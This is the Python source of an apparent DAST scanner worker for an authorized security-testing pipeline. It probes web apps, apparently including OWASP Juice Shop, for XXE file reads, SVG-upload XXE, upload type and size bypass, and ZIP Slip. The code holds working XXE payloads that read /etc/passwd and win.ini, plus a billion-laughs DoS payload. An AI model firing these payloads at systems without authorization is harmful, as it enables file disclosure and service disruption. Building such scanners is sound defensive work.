"""
XXE + File Upload Security Worker
===================================
Phase: DAST  (non-exploitative — reads files, does not modify them)
Queue: scan.dast.xxe

What this worker tests
-----------------------
  Surface 1 — XML injection on REST endpoints
    Replays each discovered endpoint with Content-Type: application/xml and an
    XXE payload.  If the server parses the XML and returns /etc/passwd or
    win.ini content, confirmed Local File Read via XXE.

  Surface 2 — SVG file upload (image endpoints)
    SVG is valid XML.  Many frameworks parse SVG metadata, exposing XXE.
    Worker uploads a minimal SVG containing DOCTYPE + ENTITY referencing
    /etc/passwd.  Confirms if file content appears in the response.

  Surface 3 — Generic file upload type-bypass
    Uploads a JavaScript file disguised as PDF/ZIP.
    Uploads a file > 100 kB to test size limits.
    Checks whether the server accepts or rejects — missing validation = finding.

  Surface 4 — ZIP Slip (path traversal in archive)
    Crafts a ZIP containing a file with a traversal name (../../evil.txt).
    If server extracts without sanitizing filenames, arbitrary write is possible.

Juice Shop specifics
---------------------
  /file-upload     — B2B ZIP/XML upload endpoint
  /api/Users/:id/profileImage — profile picture (accepts SVG → XXE)
  /rest/user/whoami — returns JSON; re-tested with application/xml body

Detection strategy
-------------------
  - Response body contains known OS file content  →  Local File Read (high)
  - Server hangs > TIMING_THRESHOLD after DoS payload  →  XXE DoS (medium)
  - File with wrong MIME accepted (200/201)  →  Upload Type bypass (medium)
  - File > MAX_BYTES accepted  →  Upload Size bypass (low)
  - ZIP with traversal path accepted  →  ZIP Slip (high)
"""

import asyncio
import io
import logging
import os
import sys
import zipfile
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, urljoin

import httpx

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../../")))

from shared.worker_base import BaseWorker
from shared.models import SeverityLevel

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-8s | %(name)s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("xxe-worker")

REQUEST_TIMEOUT   = float(os.getenv("XXE_REQUEST_TIMEOUT",  "12"))
TIMING_THRESHOLD  = float(os.getenv("XXE_TIMING_THRESHOLD", "8"))   # s — DoS detection
TOTAL_TIMEOUT     = int(os.getenv("XXE_TOTAL_TIMEOUT",      "600"))  # 10 min

# ── XXE payloads ──────────────────────────────────────────────────────────────

_XXE_TARGETS = [
    ("/etc/passwd",         ["root:x:", "daemon:", "bin/bash", "nobody:", "www-data:"]),
    ("/etc/hostname",       ["localhost", "briar", "ubuntu", "debian"]),
    ("C:\\Windows\\win.ini", ["[fonts]", "[extensions]", "for 16-bit app"]),
    ("C:/Windows/win.ini",  ["[fonts]", "[extensions]", "for 16-bit app"]),
]

def _xxe_xml(target: str) -> bytes:
    return (
        f'<?xml version="1.0" encoding="UTF-8"?>'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{target}">]>'
        f"<user><email>&xxe;</email><password>test</password></user>"
    ).encode()

def _xxe_svg(target: str) -> bytes:
    return (
        f'<?xml version="1.0" encoding="UTF-8"?>'
        f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file://{target}">]>'
        f'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
    ).encode()

# Billion-laughs DoS payload (stops at 10^6 expansions — won't actually OOM
# a hardened server, but will cause detectable slowdown on unprotected ones)
_XXE_DOS_PAYLOAD = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
]>
<lolz>&lol6;</lolz>"""

# ── Upload endpoints to probe ─────────────────────────────────────────────────

_UPLOAD_PATHS = [
    "/file-upload",
    "/upload",
    "/api/upload",
    "/api/v1/upload",
    "/api/Users/me/image",
    "/api/Users/profile/image",
    "/profile/image",
    "/avatar",
    "/api/avatar",
    "/import",
    "/api/import",
    "/api/v1/import",
]

# REST endpoints to replay with XML Content-Type
_XML_REPLAY_PATHS = [
    "/rest/user/login",
    "/rest/user/whoami",
    "/api/login",
    "/api/users",
    "/api/v1/users",
    "/login",
]

# ── Helpers ───────────────────────────────────────────────────────────────────

def _base_origin(url: str) -> str:
    p = urlparse(url)
    port = f":{p.port}" if p.port else ""
    return f"{p.scheme}://{p.hostname}{port}"


def _build_cookie_header(cookies: List[Dict]) -> str:
    return "; ".join(
        f"{c['name']}={c['value']}" for c in cookies if c.get("name")
    )


def _make_xxe_finding(
    url: str,
    vuln_type: str,
    severity: SeverityLevel,
    desc: str,
    evidence: str,
    payload: str,
    owasp: str = "A05:2021 – Security Misconfiguration",
) -> Dict[str, Any]:
    return {
        "url":              url,
        "type":             vuln_type,
        "description":      desc,
        "severity":         severity,
        "vulnerability_type": vuln_type,
        "has_params":       True,
        "raw_output": {
            "evidence":  evidence,
            "payload":   payload[:200],
            "owasp":     owasp,
            "source":    "xxe-worker",
        },
    }


def _check_lfi_indicators(body: str, indicators: List[str]) -> Optional[str]:
    """Return first matching indicator string, or None."""
    for ind in indicators:
        if ind.lower() in body.lower():
            return ind
    return None


def _make_oversized_file(size_bytes: int = 200_000) -> bytes:
    return b"A" * size_bytes


def _make_zip_slip() -> bytes:
    """Craft a ZIP with a path-traversal filename."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("../../briar_zip_slip_test.txt", "briar-zip-slip-probe")
    return buf.getvalue()


def _make_js_as_pdf() -> bytes:
    """JS file disguised with a .pdf extension in Content-Disposition."""
    return b"alert('briar-upload-bypass');"


class XXEWorker(BaseWorker):
    def __init__(self):
        super().__init__(tool_name="xxe", queue_name="scan.dast.xxe")

    async def execute_tool(
        self,
        target: str,
        auth_context: Dict[str, Any],
        task_payload: Dict[str, Any],
    ) -> List[Dict[str, Any]]:

        cookies: List[Dict] = auth_context.get("cookies", [])
        headers: Dict[str, str] = auth_context.get("headers", {})
        origin = _base_origin(target)

        auth_headers: Dict[str, str] = {
            k: v for k, v in headers.items() if k.lower() != "cookie"
        }
        cookie_str = _build_cookie_header(cookies)
        if cookie_str:
            auth_headers["Cookie"] = cookie_str

        results: List[Dict[str, Any]] = []

        async with httpx.AsyncClient(
            verify=False,
            follow_redirects=True,
            timeout=REQUEST_TIMEOUT,
        ) as client:

            # ── Surface 1: XML injection on REST endpoints ────────────────────
            logger.info(f"[xxe] Surface 1: XML replay on {len(_XML_REPLAY_PATHS)} REST paths")
            for path in _XML_REPLAY_PATHS:
                url = origin + path
                for file_target, indicators in _XXE_TARGETS:
                    payload_bytes = _xxe_xml(file_target)
                    finding = await self._test_xxe_xml(
                        client, url, payload_bytes, indicators,
                        file_target, auth_headers
                    )
                    if finding:
                        results.append(finding)
                        break  # first hit per endpoint

                # XXE DoS check (separate — only on confirmed XML endpoints)
                if any(r["url"] == url for r in results):
                    dos = await self._test_xxe_dos(client, url, auth_headers)
                    if dos:
                        results.append(dos)

            # ── Surface 2: SVG upload ─────────────────────────────────────────
            logger.info(f"[xxe] Surface 2: SVG XXE on {len(_UPLOAD_PATHS)} upload paths")
            for path in _UPLOAD_PATHS:
                url = origin + path
                for file_target, indicators in _XXE_TARGETS:
                    svg_bytes = _xxe_svg(file_target)
                    finding = await self._test_svg_upload(
                        client, url, svg_bytes, indicators,
                        file_target, auth_headers
                    )
                    if finding:
                        results.append(finding)
                        break

            # ── Surface 3: File upload type/size bypass ───────────────────────
            logger.info("[xxe] Surface 3: file upload bypass tests")
            for path in _UPLOAD_PATHS:
                url = origin + path
                type_finding = await self._test_type_bypass(client, url, auth_headers)
                if type_finding:
                    results.append(type_finding)

                size_finding = await self._test_size_bypass(client, url, auth_headers)
                if size_finding:
                    results.append(size_finding)

            # ── Surface 4: ZIP Slip ───────────────────────────────────────────
            logger.info("[xxe] Surface 4: ZIP Slip path traversal")
            for path in _UPLOAD_PATHS:
                url = origin + path
                slip = await self._test_zip_slip(client, url, auth_headers)
                if slip:
                    results.append(slip)

        logger.info(f"[xxe] Done — {len(results)} finding(s)")
        return results

    # ── Test methods ──────────────────────────────────────────────────────────

    async def _test_xxe_xml(
        self,
        client: httpx.AsyncClient,
        url: str,
        payload: bytes,
        indicators: List[str],
        file_target: str,
        headers: Dict[str, str],
    ) -> Optional[Dict[str, Any]]:
        try:
            resp = await client.post(
                url,
                content=payload,
                headers={**headers, "Content-Type": "application/xml"},
            )
            if resp.status_code in (404, 405, 415):
                return None
            body = resp.text
            match = _check_lfi_indicators(body, indicators)
            if match:
                logger.info(f"[xxe] XXE LFI via XML on {url} — indicator: {match!r}")
                return _make_xxe_finding(
                    url, "xxe_lfi", SeverityLevel.critical,
                    f"XXE Local File Read: server returned content of {file_target!r}",
                    f"Response contains {match!r} from {file_target}",
                    payload.decode(errors="replace"),
                    "A05:2021 – Security Misconfiguration",
                )
        except Exception as e:
            logger.debug(f"[xxe] XML test {url}: {e}")
        return None

    async def _test_xxe_dos(
        self,
        client: httpx.AsyncClient,
        url: str,
        headers: Dict[str, str],
    ) -> Optional[Dict[str, Any]]:
        import time
        try:
            t0 = time.monotonic()
            resp = await client.post(
                url,
                content=_XXE_DOS_PAYLOAD,
                headers={**headers, "Content-Type": "application/xml"},
                timeout=TIMING_THRESHOLD + 2,
            )
            elapsed = time.monotonic() - t0
            if elapsed > TIMING_THRESHOLD:
                logger.info(f"[xxe] XXE DoS timing on {url} — {elapsed:.1f}s")
                return _make_xxe_finding(
                    url, "xxe_dos", SeverityLevel.medium,
                    "XXE DoS: server took unusually long parsing billion-laughs payload",
                    f"Response time {elapsed:.1f}s exceeds threshold {TIMING_THRESHOLD}s",
                    _XXE_DOS_PAYLOAD.decode(errors="replace")[:200],
                )
        except (httpx.TimeoutException, httpx.ReadTimeout):
            logger.info(f"[xxe] XXE DoS timeout on {url} — server hung")
            return _make_xxe_finding(
                url, "xxe_dos", SeverityLevel.medium,
                "XXE DoS: server timed out parsing billion-laughs payload",
                "Server did not respond within timeout — possible infinite expansion",
                _XXE_DOS_PAYLOAD.decode(errors="replace")[:200],
            )
        except Exception as e:
            logger.debug(f"[xxe] DoS test {url}: {e}")
        return None

    async def _test_svg_upload(
        self,
        client: httpx.AsyncClient,
        url: str,
        svg_bytes: bytes,
        indicators: List[str],
        file_target: str,
        headers: Dict[str, str],
    ) -> Optional[Dict[str, Any]]:
        try:
            resp = await client.post(
                url,
                files={"file": ("briar-test.svg", svg_bytes, "image/svg+xml")},
                headers={k: v for k, v in headers.items() if k.lower() != "content-type"},
            )
            if resp.status_code in (404, 405):
                return None
            body = resp.text
            match = _check_lfi_indicators(body, indicators)
            if match:
                logger.info(f"[xxe] SVG XXE on {url} — indicator: {match!r}")
                return _make_xxe_finding(
                    url, "xxe_lfi", SeverityLevel.critical,
                    f"XXE via SVG upload: server returned content of {file_target!r}",
                    f"Response contains {match!r} from {file_target}",
                    svg_bytes.decode(errors="replace"),
                )
        except Exception as e:
            logger.debug(f"[xxe] SVG upload {url}: {e}")
        return None

    async def _test_type_bypass(
        self,
        client: httpx.AsyncClient,
        url: str,
        headers: Dict[str, str],
    ) -> Optional[Dict[str, Any]]:
        """Upload a JS file with .pdf extension and text/javascript MIME."""
        js_payload = _make_js_as_pdf()
        try:
            resp = await client.post(
                url,
                files={"file": ("exploit.pdf", js_payload, "application/javascript")},
                headers={k: v for k, v in headers.items() if k.lower() != "content-type"},
            )
            if resp.status_code in (404, 405):
                return None
            # Server accepted the wrong MIME type
            if resp.status_code in (200, 201):
                logger.info(f"[xxe] Upload type bypass on {url} — JS as PDF accepted")
                return _make_xxe_finding(
                    url, "upload_type_bypass", SeverityLevel.medium,
                    "File upload type validation missing: JavaScript accepted with .pdf extension",
                    f"HTTP {resp.status_code}: server accepted application/javascript as application/pdf",
                    "JS payload disguised as PDF",
                    "A05:2021 – Security Misconfiguration",
                )
        except Exception as e:
            logger.debug(f"[xxe] Type bypass {url}: {e}")
        return None

    async def _test_size_bypass(
        self,
        client: httpx.AsyncClient,
        url: str,
        headers: Dict[str, str],
    ) -> Optional[Dict[str, Any]]:
        """Upload a 200 kB file to test size limits."""
        big_file = _make_oversized_file(200_000)
        try:
            resp = await client.post(
                url,
                files={"file": ("bigfile.pdf", big_file, "application/pdf")},
                headers={k: v for k, v in headers.items() if k.lower() != "content-type"},
                timeout=15,
            )
            if resp.status_code in (404, 405):
                return None
            if resp.status_code in (200, 201):
                logger.info(f"[xxe] Upload size bypass on {url} — 200kB accepted")
                return _make_xxe_finding(
                    url, "upload_size_bypass", SeverityLevel.low,
                    "File upload size limit missing: 200 kB file accepted without rejection",
                    f"HTTP {resp.status_code}: server accepted 200 kB upload",
                    "200kB binary payload",
                    "A05:2021 – Security Misconfiguration",
                )
        except Exception as e:
            logger.debug(f"[xxe] Size bypass {url}: {e}")
        return None

    async def _test_zip_slip(
        self,
        client: httpx.AsyncClient,
        url: str,
        headers: Dict[str, str],
    ) -> Optional[Dict[str, Any]]:
        """Upload a ZIP with path-traversal filename."""
        zip_bytes = _make_zip_slip()
        try:
            resp = await client.post(
                url,
                files={"file": ("archive.zip", zip_bytes, "application/zip")},
                headers={k: v for k, v in headers.items() if k.lower() != "content-type"},
            )
            if resp.status_code in (404, 405):
                return None
            if resp.status_code in (200, 201):
                logger.info(f"[xxe] ZIP Slip candidate on {url}")
                return _make_xxe_finding(
                    url, "zip_slip", SeverityLevel.high,
                    "ZIP Slip: server accepted ZIP with path-traversal filename (../../briar_zip_slip_test.txt)",
                    f"HTTP {resp.status_code}: archive with traversal entry was accepted without rejection",
                    "ZIP with ../../briar_zip_slip_test.txt entry",
                    "A01:2021 – Broken Access Control",
                )
        except Exception as e:
            logger.debug(f"[xxe] ZIP Slip {url}: {e}")
        return None


async def main():
    worker = XXEWorker()
    await worker.start()
    try:
        while worker.running:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        await worker.shutdown()


if __name__ == "__main__":
    asyncio.run(main())
